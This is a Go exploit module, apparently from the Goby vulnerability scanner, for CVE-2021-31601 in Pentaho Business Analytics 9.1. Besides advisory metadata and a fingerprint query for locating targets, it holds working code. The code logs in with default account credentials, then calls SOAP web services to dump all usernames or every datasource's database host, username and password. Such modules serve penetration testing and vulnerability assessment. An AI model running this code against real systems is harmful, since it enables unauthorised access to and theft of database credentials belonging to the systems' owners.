package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Pentaho Business Analytics 9.1 Information leakage (CVE-2021-31601)",
    "Description": "<p>Pentaho Business Analytics is a business analysis platform that enables you to safely access, integrate, operate, visualize and analyze big data assets.</p><p>A verified low-privilege attacker (tiffany:password) can list the connection details of all data sources used by Pentaho through the data source management service of /pentaho/webservices/datasourceMgmtService.</p>",
    "Impact": "Pentaho Business Analytics 9.1 Information leakage (CVE-2021-31601)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://help.hitachivantara.com/Documentation/Pentaho/9.1\">https://help.hitachivantara.com/Documentation/Pentaho/9.1</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
    "Product": "Pentaho",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "Pentaho 业务分析平台9.1版本后台信息泄露漏洞（CVE-2021-31601）",
            "Description": "<p>Pentaho Business Analytics是一款使您能够安全地访问、集成、操作、可视化和分析大数据资产的业务分析平台。</p><p>通过验证的低权限攻击者(tiffany:password)可通过/pentaho/webservices/datasourceMgmtService 的数据源管理服务列出 Pentaho 使用的所有数据源的连接详细信息。</p>",
            "Impact": "<p>通过验证的低权限攻击者(tiffany:password)可通过/pentaho/webservices/datasourceMgmtService 的数据源管理服务列出 Pentaho 使用的所有数据源的连接详细信息。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://help.hitachivantara.com/Documentation/Pentaho/9.1\">https://help.hitachivantara.com/Documentation/Pentaho/9.1</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、升级Apache系统版本。</p>",
            "Product": "Pentaho",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Pentaho Business Analytics 9.1 Information leakage (CVE-2021-31601)",
            "Description": "<p>Pentaho Business Analytics is a business analysis platform that enables you to safely access, integrate, operate, visualize and analyze big data assets.</p><p>A verified low-privilege attacker (tiffany:password) can list the connection details of all data sources used by Pentaho through the data source management service of /pentaho/webservices/datasourceMgmtService.</p>",
            "Impact": "Pentaho Business Analytics 9.1 Information leakage (CVE-2021-31601)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://help.hitachivantara.com/Documentation/Pentaho/9.1\">https://help.hitachivantara.com/Documentation/Pentaho/9.1</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
            "Product": "Pentaho",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "body=\"j_username\" && body=\"j_password\" && body=\"pentaho\"",
    "GobyQuery": "body=\"j_username\" && body=\"j_password\" && body=\"pentaho\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://help.hitachivantara.com/Documentation/Pentaho/9.1",
    "DisclosureDate": "2021-11-08",
    "References": [
        "https://packetstormsecurity.com/files/164779/Pentaho-Business-Analytics-Pentaho-Business-Server-9.1-Insufficient-Access-Control.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "6.0",
    "CVEIDs": [
        "CVE-2021-31601"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202111-529"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "usernames,databases",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Pentaho"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10236"
}`

	CookieFind1108 := func(hostinfo *httpclient.FixUrl) (string, string) {
		username := [5]string{"admin", "joe", "suzy", "tiffany", "pat"}
		Cookie := ""
		usernameFind := ""
		for i := 0; i < 5; i++ {
			uri1 := "/pentaho/j_spring_security_check"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg1.Data = `j_username=` + username[i] + `&j_password=password`
			if resp1, err := httpclient.DoHttpRequest(hostinfo, cfg1); err == nil {
				if strings.Contains(resp1.HeaderString.String(), "/pentaho/Home") {
					CookieFind := regexp.MustCompile("Set-Cookie: JSESSIONID=(.*?);").FindStringSubmatch(resp1.HeaderString.String())
					Cookie = CookieFind[1]
					usernameFind = username[i]
					break
				}
			}
		}
		return Cookie, usernameFind
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cookieFind, usernameFind := CookieFind1108(u)
			uri2 := "/pentaho/webservices/userRoleListService"
			cfg2 := httpclient.NewPostRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("Cookie", "JSESSIONID="+cookieFind)
			cfg2.Data = `<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/"><Body><getAllUsers xmlns="http://ws.userrole.security.platform.pentaho.org/"/></Body></Envelope>`
			if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
				ss.VulURL = u.Scheme() + "://" + usernameFind + ":password@" + u.IP + ":" + u.Port + "/"
				return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "getAllUsersResponse")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cookieFind, usernameFind := CookieFind1108(expResult.HostInfo)
			if ss.Params["AttackType"].(string) == "usernames" {
				uri2 := "/pentaho/webservices/userRoleListService"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Cookie", "JSESSIONID="+cookieFind)
				cfg2.Data = `<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/"><Body><getAllUsers xmlns="http://ws.userrole.security.platform.pentaho.org/"/></Body></Envelope>`
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					expResult.Output = "user:" + usernameFind + "\npass:password\n\n"
					regexpUsernameFind := regexp.MustCompile("(?s)<return>(.*?)</return>").FindAllStringSubmatch(resp2.RawBody, -1)
					for _, i := range regexpUsernameFind {
						expResult.Output += i[1] + "\n"
					}
					expResult.Success = true
				}
			}
			if ss.Params["AttackType"].(string) == "databases" {
				uri3 := "/pentaho/webservices/datasourceMgmtService"
				cfg3 := httpclient.NewPostRequestConfig(uri3)
				cfg3.VerifyTls = false
				cfg3.FollowRedirect = false
				cfg3.Header.Store("Cookie", "JSESSIONID="+cookieFind)
				cfg3.Data = `<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/"><Body><getDatasources xmlns="http://webservices.repository.platform.pentaho.org/"/></Body></Envelope>`
				if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil {
					expResult.Output = "user:" + usernameFind + "\npass:password\n\n"
					regexpUsernameFind := regexp.MustCompile("(?s)<return>(.*?)</return>").FindAllStringSubmatch(resp3.RawBody, -1)
					for _, i := range regexpUsernameFind {
						databaseType := regexp.MustCompile("<databaseType>(.*?)</databaseType>").FindStringSubmatch(i[1])
						databasePort := regexp.MustCompile("<databasePort>(.*?)</databasePort>").FindStringSubmatch(i[1])
						databaseName := regexp.MustCompile("<databaseName>(.*?)</databaseName>").FindStringSubmatch(i[1])
						hostname := regexp.MustCompile("<hostname>(.*?)</hostname>").FindStringSubmatch(i[1])
						username := regexp.MustCompile("<username>(.*?)</username>").FindStringSubmatch(i[1])
						password := regexp.MustCompile("<password>(.*?)</password>").FindStringSubmatch(i[1])
						expResult.Output += "databaseType: " + databaseType[1] + "\ndatabasePort: " + databasePort[1] + "\ndatabaseName: " + databaseName[1] + "\nhostname: " + hostname[1] + "\nusername: " + username[1] + "\npassword: " + password[1] + "\n"
					}
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
